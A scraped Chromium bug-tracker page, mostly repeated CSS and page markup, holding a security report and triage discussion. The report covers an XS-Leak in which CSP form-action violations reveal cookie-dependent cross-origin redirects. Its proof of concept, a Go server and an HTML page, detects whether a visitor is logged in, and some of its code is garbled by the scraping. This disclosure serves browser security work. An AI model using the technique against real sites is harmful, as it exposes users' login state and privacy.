         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }

              <mr-autocomplete vocabularyname="project" for="targetProjectInput" role="listbox" id="chops-autocomplete-1"><!---->
      <style>
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }
      </style>
      <div class="chops-autocomplete-container">
        <span class="screenreader-hidden" aria-live="polite">
          
        </span>
        <table hidden="">
          <tbody>
            
          </tbody>
        </table>
      </div>
    <!----></mr-autocomplete>
            </div>
          </div>

      <style>
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }

              Discard

      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

    display: inline;
    padding: 0;
    margin: 0;
    border: 0;
    background: 0;
    cursor: pointer;
  }
  h1, h2, h3, h4 {
    background: none;
  }

    color: var(--chops-link-color);
    text-decoration: none;
    font-weight: var(--chops-link-font-weight);
    font-family: var(--chops-font-family);
  }
  a:hover, .linkify:hover {
    text-decoration: underline;
  }
  a.button, .button {
    /* Links that look like buttons. */
    display: inline-flex;
    align-items: center;
    justify-content: center;
    text-decoration: none;
    transition: filter 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
  }
  a.button:hover, .button:hover {
    filter: brightness(95%);
  }

    margin: 0;
    margin-left: auto;
  }
  a.button, .button {
    padding: var(--chops-button-padding);
  }

    display: block;
    margin-right: 4px;
  }
  chops-button.emphasized, a.button.emphasized, .button.emphasized {
    background: var(--chops-primary-button-bg);
    color: var(--chops-primary-button-color);
    text-shadow: 1px 1px 3px hsla(0, 0%, 0%, 0.25);
  }
  textarea, select, input {
    box-sizing: border-box;

  * accessibility because styles will not always line up with semantically
  * appropriate heading levels.
  */
  .medium-heading {
    font-size: var(--chops-large-font-size);

      <style>
        
  :host {
    --mr-edit-field-padding: 0.125em 4px;
    --mr-edit-field-width: 90%;
    --mr-input-grid-gap: 6px;
    font-family: var(--chops-font-family);

  /** Converts a <button> to look like an <a> tag. */
  .linkify {
    display: inline;
    padding: 0;
    margin: 0;
    border: 0;
    background: 0;
    cursor: pointer;
  }
  h1, h2, h3, h4 {
    background: none;
  }
  a, chops-button, a.button, .button, .linkify {
    color: var(--chops-link-color);
    text-decoration: none;
    font-weight: var(--chops-link-font-weight);
    font-family: var(--chops-font-family);
  }
  a:hover, .linkify:hover {
    text-decoration: underline;
  }
  a.button, .button {
    /* Links that look like buttons. */
    display: inline-flex;
    align-items: center;
    justify-content: center;
    text-decoration: none;
    transition: filter 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
  }
  a.button:hover, .button:hover {
    filter: brightness(95%);
  }
  chops-button, a.button, .button {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
    background: var(--chops-white);
    border-radius: 6px;
    --chops-button-padding: 0.25em 8px;
    margin: 0;
    margin-left: auto;
  }
  a.button, .button {
    padding: var(--chops-button-padding);
  }
  chops-button i.material-icons, a.button i.material-icons, .button i.material-icons {
    display: block;
    margin-right: 4px;
  }
  chops-button.emphasized, a.button.emphasized, .button.emphasized {
    background: var(--chops-primary-button-bg);
    color: var(--chops-primary-button-color);
    text-shadow: 1px 1px 3px hsla(0, 0%, 0%, 0.25);
  }
  textarea, select, input {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
  }
  /* Note: decoupling heading levels from styles is useful for
  * accessibility because styles will not always line up with semantically
  * appropriate heading levels.
  */
  .medium-heading {
    font-size: var(--chops-large-font-size);
    font-weight: normal;
    line-height: 1;
    padding: 0.25em 0;
    color: var(--chops-link-color);
    margin: 0;
    margin-top: 0.25em;
    border-bottom: var(--chops-normal-border);
  }
  .medium-heading chops-button {
    line-height: 1.6;
  }
  .input-grid {
    padding: 0.5em 0;
    display: grid;
    max-width: 100%;
    grid-gap: var(--mr-input-grid-gap);
    grid-template-columns: minmax(120px, max-content) 1fr;
    align-items: flex-start;
  }
  .input-grid label {
    font-weight: bold;
    text-align: right;
    word-wrap: break-word;
  }
  @media (max-width: 600px) {
    .input-grid label {
      margin-top: var(--mr-input-grid-gap);
      text-align: left;
    }
    .input-grid {
      grid-gap: var(--mr-input-grid-gap);
      grid-template-columns: 100%;
    }
  }

        mr-app {
          display: block;
          padding-top: var(--monorail-header-height);
          margin-top: -1px; /* Prevent a double border from showing up. */

          /* From shared-styles.js. */
          --mr-edit-field-padding: 0.125em 4px;
          --mr-edit-field-width: 90%;
          --mr-input-grid-gap: 6px;
          font-family: var(--chops-font-family);
          color: var(--chops-primary-font-color);
          font-size: var(--chops-main-font-size);
        }
        main {
          border-top: var(--chops-normal-border);
        }
        .snackbar-container {
          position: fixed;
          bottom: 1em;
          left: 1em;
          display: flex;
          flex-direction: column;
          align-items: flex-start;
          z-index: 1000;
        }
        /** Unfix <chops-snackbar> to allow stacking. */
        chops-snackbar {
          position: static;
          margin-top: 0.5em;
        }
        .project-alert {
          background: var(--chops-orange-50);
          color: var(--chops-field-error-color);
          display: block;
          font-weight: bold;
          text-align: center;
        }
      </style>

          Note: Only signed in users can star issues or add comments, and
          only project members can select issues for bulk edits.

          Note: Only signed in users can star issues or add comments, and
          only project members can select issues for bulk edits.

                <span class="key-tip"><!---->star the current issue<!----></span>
              <!---->
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->?<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                <span class="key-tip"><!---->show this help dialog<!----></span>
              <!---->
            </div>
          <!---->
        </div>
        <p>
          Note: Only signed in users can star issues or add comments, and
          only project members can select issues for bulk edits.
        </p>
      </chops-dialog>
    <mr-keystrokes></mr-keystrokes>

    <mr-cue centered="" cueprefname="search_for_numbers" hidden=""></mr-cue>


          
      
        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }

        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

      
      
        
          <slot></slot>
        <div class="dialog-content">
          <slot></slot>
        </div>
      <dialog class="dialog" role="dialog">
        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>

          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

      VULNERABILITY DETAILS<b class="line"><!---->VULNERABILITY DETAILS<!----></b><br><br>Chromium's design decision to block redirects on CSP's form-action directive somewhat undermines the benefits of SameSite=Lax. A third-party site can indeed detect the occurence of a cross-origin (server-side) redirect, even if this redirect requires, in order to occur, the presence of some SameSite=Lax cookie in the initial request.<span class="line"><!---->Chromium's design decision to block redirects on CSP's form-action directive somewhat undermines the benefits of SameSite=Lax. A third-party site can indeed detect the occurence of a cross-origin (server-side) redirect, even if this redirect requires, in order to occur, the presence of some SameSite=Lax cookie in the initial request.<!----></span><br><br>I've documented this technique on<span class="line"><!---->I've documented this technique on<!----></span> <span class="line"><!----> <!----></span>xsleaks.dev<a class="undefined" target="_blank" href="https://xsleaks.dev"><!---->xsleaks.dev<!----></a> (see <span class="line"><!----> (see <!----></span>https://xsleaks.dev/docs/attacks/navigations/#csp-violations<a class="undefined" target="_blank" href="https://xsleaks.dev/docs/attacks/navigations/#csp-violations"><!---->https://xsleaks.dev/docs/attacks/navigations/#csp-violations<!----></a>)<span class="line"><!---->)<!----></span> and I've leveraged it in a privacy attack against Slack users (see <span class="line"><!----> and I've leveraged it in a privacy attack against Slack users (see <!----></span>https://jub0bs.com/posts/2021-10-12-xsleak-stack/<a class="undefined" target="_blank" href="https://jub0bs.com/posts/2021-10-12-xsleak-stack/"><!---->https://jub0bs.com/posts/2021-10-12-xsleak-stack/<!----></a>).<span class="line"><!---->).<!----></span><br><br>As pointed out by Egor Homakov in an older issue (#313737), this behaviour can prove problematic, e.g. for OAuth.<span class="line"><!---->As pointed out by Egor Homakov in an older issue (#313737), this behaviour can prove problematic, e.g. for OAuth.<!----></span><br><br>---<span class="line"><!---->---<!----></span><br><br>Whether CSP's form-action should block redirects after a form submission is a matter of dispute; even the W3C hasn't made up its collective mind and<span class="line"><!---->Whether CSP's form-action should block redirects after a form submission is a matter of dispute; even the W3C hasn't made up its collective mind and<!----></span><br>the directive's behaviour in the face of redirects remains unspecified.<span class="line"><!---->the directive's behaviour in the face of redirects remains unspecified.<!----></span><br><br>The conversation in the relevant GitHub issue (<span class="line"><!---->The conversation in the relevant GitHub issue (<!----></span>https://github.com/w3c/webappsec-csp/issues/8<a class="undefined" target="_blank" href="https://github.com/w3c/webappsec-csp/issues/8"><!---->https://github.com/w3c/webappsec-csp/issues/8<!----></a>)<span class="line"><!---->)<!----></span> has so far revolved around the risk of form-data exfiltration and the tradeoff between strictness and usability, but the possibility of an attacker abusing form-action to effect an XSLeak appears to have been overlooked.<span class="line"><!----> has so far revolved around the risk of form-data exfiltration and the tradeoff between strictness and usability, but the possibility of an attacker abusing form-action to effect an XSLeak appears to have been overlooked.<!----></span><br><br>VERSION<b class="line"><!---->VERSION<!----></b><br><br>Chrome Version: 97.0.4666.2 (Official Build) canary (x86_64)<span class="line"><!---->Chrome Version: 97.0.4666.2 (Official Build) canary (x86_64)<!----></span><br>Operating System: macOS Big Sur 11.5.2<span class="line"><!---->Operating System: macOS Big Sur 11.5.2<!----></span><br><br>REPRODUCTION CASE<b class="line"><!---->REPRODUCTION CASE<!----></b><br><br>Assume that the following Go server is bound to localhost:8081:<span class="line"><!---->Assume that the following Go server is bound to localhost:8081:<!----></span><br><br>```go<span class="line"><!---->```go<!----></span><br>package main<span class="line"><!---->package main<!----></span><br><br>import (<span class="line"><!---->import (<!----></span><br>  "io"<span class="line"><!---->  "io"<!----></span><br>  "log"<span class="line"><!---->  "log"<!----></span><br>  "net/http"<span class="line"><!---->  "net/http"<!----></span><br>  "time"<span class="line"><!---->  "time"<!----></span><br>)<span class="line"><!---->)<!----></span><br><br>const (<span class="line"><!---->const (<!----></span><br>  cookieName  = "session"<span class="line"><!---->  cookieName  = "session"<!----></span><br>  contentType = "Content-Type"<span class="line"><!---->  contentType = "Content-Type"<!----></span><br>  plainText   = "text/plain"<span class="line"><!---->  plainText   = "text/plain"<!----></span><br>)<span class="line"><!---->)<!----></span><br><br>func main() {<span class="line"><!---->func main() {<!----></span><br>  http.HandleFunc("/set", setCookie)<span class="line"><!---->  http.HandleFunc("/set", setCookie)<!----></span><br>  http.HandleFunc("/clear", clearCookie)<span class="line"><!---->  http.HandleFunc("/clear", clearCookie)<!----></span><br>  http.HandleFunc("/maybe-redirect", maybeRedirect)<span class="line"><!---->  http.HandleFunc("/maybe-redirect", maybeRedirect)<!----></span><br>  if err := http.ListenAndServe(":8081", nil); err != nil {<span class="line"><!---->  if err := http.ListenAndServe(":8081", nil); err != nil {<!----></span><br>    log.Fatal(err)<span class="line"><!---->    log.Fatal(err)<!----></span><br>  }<span class="line"><!---->  }<!----></span><br>}<span class="line"><!---->}<!----></span><br><br>func setCookie(w http.ResponseWriter, r *http.Request) {<span class="line"><!---->func setCookie(w http.ResponseWriter, r *http.Request) {<!----></span><br>  w.Header().Set(contentType, plainText)<span class="line"><!---->  w.Header().Set(contentType, plainText)<!----></span><br>  cookie := http.Cookie{<span class="line"><!---->  cookie := http.Cookie{<!----></span><br>    Name:     cookieName,<span class="line"><!---->    Name:     cookieName,<!----></span><br>    Value:    "whatever",<span class="line"><!---->    Value:    "whatever",<!----></span><br>    Path:     "/",<span class="line"><!---->    Path:     "/",<!----></span><br>    Secure:   true,<span class="line"><!---->    Secure:   true,<!----></span><br> class="line"><!---->  io.WriteString(w, "SameSite=Lax cookie set!")<!----></span><br>}<span class="line"><!---->}<!----></span><br><br>func clearCookie(w http.ResponseWriter, r *http.Request) {<span class="line"><!---->func clearCookie(w http.ResponseWriter, r *http.Request) {<!----></span><br>  w.Header().Set(contentType, plainText)<span class="line"><!---->  w.Header().Set(contentType, plainText)<!----></span><br>  // clear cookie<span class="line"><!---->  // clear cookie<!----></span><br>  cookie := http.Cookie{<span class="line"><!---->  cookie := http.Cookie{<!----></span><br> class="line"><!---->  io.WriteString(w, "Cookie cleared.")<!----></span><br>}<span class="line"><!---->}<!----></span><br><br>func maybeRedirect(w http.ResponseWriter, r *http.Request) {<span class="line"><!---->func maybeRedirect(w http.ResponseWriter, r *http.Request) {<!----></span><br>  w.Header().Set(contentType, plainText)<span class="line"><!---->  w.Header().Set(contentType, plainText)<!----></span><br>  for _, c := range r.Cookies() {<span class="line"><!---->  for _, c := range r.Cookies() {<!----></span><br>    if c.Name == cookieName {<span class="line"><!---->    if c.Name == cookieName {<!----></span><br>      const redirectPath = "<span class="line"><!---->      const redirectPath = "<!----></span>https://twitter.com/jub0bs<a class="undefined" target="_blank" href="https://twitter.com/jub0bs"><!---->https://twitter.com/jub0bs<!----></a>"<span class="line"><!---->"<!----></span><br>      http.Redirect(w, r, redirectPath, http.StatusFound)<span class="line"><!---->      http.Redirect(w, r, redirectPath, http.StatusFound)<!----></span><br>      return<span class="line"><!---->      return<!----></span><br>    }<span class="line"><!----> redirect...")<!----></span><br>}<span class="line"><!---->}<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>The /maybe-redirect endpoint results in a cross-site redirect (to my Twitter profile, for this example) only if a SameSite=Lax cookie named "session" is attached to the request.<span class="line"><!---->The /maybe-redirect endpoint results in a cross-site redirect (to my Twitter profile, for this example) only if a SameSite=Lax cookie named "session" is attached to the request.<!----></span><br><br>If the victim visits the malicious page below and has the required cookie on localhost:8081, the redirect occurs, which triggers a CSP violation and "notifies" the attacker.<span class="line"><!---->If the victim visits the malicious page below and has the required cookie on localhost:8081, the redirect occurs, which triggers a CSP violation and "notifies" the attacker.<!----></span><br><br>```html<span class="line"><!---->```html<!----></span><br><!doctype http-equiv="Content-Security-Policy"<!----></span><br>          content="form-action <span class="line"><!---->          content="form-action <!----></span>http://localhost:8081<a class="undefined" action="<span class="line"><!---->          action="<!----></span>http://localhost:8081/maybe-redirect<a class="undefined" target="_blank" href="http://localhost:8081/maybe-redirect"><!---->http://localhost:8081/maybe-redirect<!----></a>"><span class="line"><!---->"&gt;<!----></span><br>    </form><span class="line"><!---->    &lt;/form&gt;<!----></span><br>    <script><span class="line"><!---->    &lt;script&gt;<!----></span><br>      window.addEventListener('securitypolicyviolation', () => {<span class="line"><!---->      window.addEventListener('securitypolicyviolation', () =&gt; {<!----></span><br>          alert("User is logged in!")<span class="line"><!---->          alert("User is logged in!")<!----></span><br>        });<span class="line"><!---->        });<!----></span><br>      myForm.submit();<span class="line"><!---->      myForm.submit();<!----></span><br>    </script><span class="line"><!---->         Thanks for your report! My understanding of this report is that this is a small proof-of-concept that replicates the same attack that your blog post describes against Slack -- is that correct?<span class="line"><!---->Thanks for your report! My understanding of this report is that this is a small proof-of-concept that replicates the same attack that your blog post describes against Slack -- is that correct?<!----></span><br><br>Tentatively setting this as Severity-Medium (treating an XSLeak as a partial/mitigated bypass of the same-origin policy) and FoundIn-94 as I can repro on Stable. I think this likely affects all Blink platforms.<span class="line"><!---->Tentatively setting this as Severity-Medium (treating an XSLeak as a partial/mitigated bypass of the same-origin policy) and FoundIn-94 as I can repro on Stable. I think this likely affects all Blink platforms.<!----></span><br><br>IIRC antoniosartori@ you're one of our CSP experts -- could you take a look at this? Also +mkwst@ for any second opinions on security labels.<span class="line"><!---->IIRC antoniosartori@ you're one of our CSP experts -- could you take a look at this?         My exact repro steps were:<span class="line"><!---->My exact repro steps were:<!----></span><br><br>0. Download both files into one directory and cd into it<span class="line"><!---->0. Download both files into one directory and cd into it<!----></span><br>1. Start the server with `go run server.go`<span class="line"><!---->1. Start the server with `go run server.go`<!----></span><br>2. Visit localhost:8081/set to set the cookie<span class="line"><!---->2. Visit localhost:8081/set to set the cookie<!----></span><br>3. In a second tab, load malicious.html from file (dragging and dropping)<span class="line"><!---->3. In a second tab, load malicious.html from file (dragging and dropping)<!----></span><br>4. See that securitypolicyviolation listener fires and the alert is shown<span class="line"><!---->4. See that securitypolicyviolation listener fires and the alert is shown<!----></span><mr-comment-content></mr-comment-content>

        Thanks for the report. If I understand correctly, there are a few things that we could do to help here:<span class="line"><!---->Thanks for the report. If I understand correctly, there are a few things that we could do to help here:<!----></span><br>1) Stop checking CSP form-action on redirects (as Firefox and Safari do, IIUC)<span class="line"><!---->1) Stop checking CSP form-action on redirects (as Firefox and Safari do, IIUC)<!----></span><br>2) Avoid reporting CSP violations in case of redirects.<span class="line"><!---->2) Avoid reporting CSP violations in case of redirects.<!----></span><br>3) Drop LAX cookies from form requests.<span class="line"><!---->3) Drop LAX cookies from form requests.<!----></span><br><br>Would you agree?<span class="line"><!---->Would you agree?<!----></span><br><br>3) is unlikely to happen in the short term.<span class="line"><!---->3) is unlikely to happen in the short term.<!----></span><br>1) is something we could do, I believe.<span class="line"><!---->1) is something we could do, I believe.<!----></span><br>2) seems like a general solution to prevent XS leaks which I believe we should explore.<span class="line"><!---->2) seems like a general solution to prevent XS leaks which I believe we should explore.<!----></span><br><br>If I understand correctly, the same bug would apply to CSP navigate-to as currently specified (if we were to ship it).<span class="line"><!---->If I understand correctly, the same bug would apply to CSP navigate-to as currently specified (if we were to ship it).<!----></span><mr-comment-content></mr-comment-content>

        Probably the 1) option is the best one. One could still bypass the form-action directive with open redirect found in whitelisted domains, but this still needs to chain multiple vulnerabilities, and the impact isn't too bad anyway. Same would apply for navigate-to directive.<span class="line"><!---->Probably the 1) option is the best one. One could still bypass the form-action directive with open redirect found in whitelisted domains, but this still needs to chain multiple vulnerabilities, and the impact isn't too bad anyway. Same would apply for navigate-to directive.<!----></span><mr-comment-content></mr-comment-content>

        Referring to <span class="line"><!---->Referring to <!----></span>comment#5<a class="undefined" target="_blank" href="#c5"><!---->comment#5<!----></a>. Given the discussion on <span class="line"><!---->. Given the discussion on <!----></span>https://github.com/w3c/webappsec-csp/issues/517<a class="undefined" target="_blank" href="https://github.com/w3c/webappsec-csp/issues/517"><!---->https://github.com/w3c/webappsec-csp/issues/517<!----></a>,<span class="line"><!---->,<!----></span> option 2) does not really make sense.<span class="line"><!----> option 2) does not really make sense.<!----></span><br><br>I still believe we should implement 1). This is a behavioural change, though. Moreover, the discussion around form-action and redirects has been going on for a long time (<span class="line"><!---->I still believe we should implement 1). This is a behavioural change, though. Moreover, the discussion around form-action and redirects has been going on for a long time (<!----></span>https://github.com/w3c/webappsec-csp/issues/8<a class="undefined" target="_blank" href="https://github.com/w3c/webappsec-csp/issues/8"><!---->https://github.com/w3c/webappsec-csp/issues/8<!----></a>)<span class="line"><!---->)<!----></span> and it does not seem to me like there is an agreement yet. Pushing this forward will require some time.<span class="line"><!----> and it does not seem to me like there is an agreement yet. Pushing this forward will require some time.<!----></span><mr-comment-content></mr-comment-content>

        by

        <div>
          <a class="comment-link" href="?id=1259077#c34">Comment 34<!----></a>

          
        by
        <mr-user-link></mr-user-link>
        on
        <chops-timestamp title="Wed, Jul 13, 2022, 8:33 AM EDT"></chops-timestamp>

      <div role="heading" class="comment-header" aria-level="2">
        <div>
          <a class="comment-link" href="?id=1259077#c34">Comment 34<!----></a>

          
        by
        <mr-user-link></mr-user-link>
        on
        <chops-timestamp title="Wed, Jul 13, 2022, 8:33 AM EDT"></chops-timestamp>
        
          <span class="role-label">Project Member</span>
      
        </div>
        
      </div>
    
      
        
      
        
          Status:<strong><!---->Status:</strong>
          
          ExternalDependency
          (was: Assigned)
          <br>
        
        
      <div class="issue-diff">
        <!---->
          <strong><!---->Status:</strong>
          
          ExternalDependency
          (was: Assigned)
          <br>
        <!---->
        
      </div><br>
    
        
      
        Basically, this bug must be weighted against the benefit of the CSP form-action directive, which allows to block exfiltrations via forms. Either we drop CSP form-action in its current form, or we decide that websites being able to learn whether a navigation they initiate redirects or not (and where) is fine.<span class="line"><!---->Basically, this bug must be weighted against the benefit of the CSP form-action directive, which allows to block exfiltrations via forms. Either we drop CSP form-action in its current form, or we decide that websites being able to learn whether a navigation they initiate redirects or not (and where) is fine.<!----></span><br><br>I will mark this as ExternalDependency, since we are unlikely to do anything until there is an agreement with the W3C on this.<span class="line"><!---->I will mark this as ExternalDependency, since we are unlikely to do anything until there is an agreement with the W3C on this.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>
        <div>
          
        </div>
      </div>
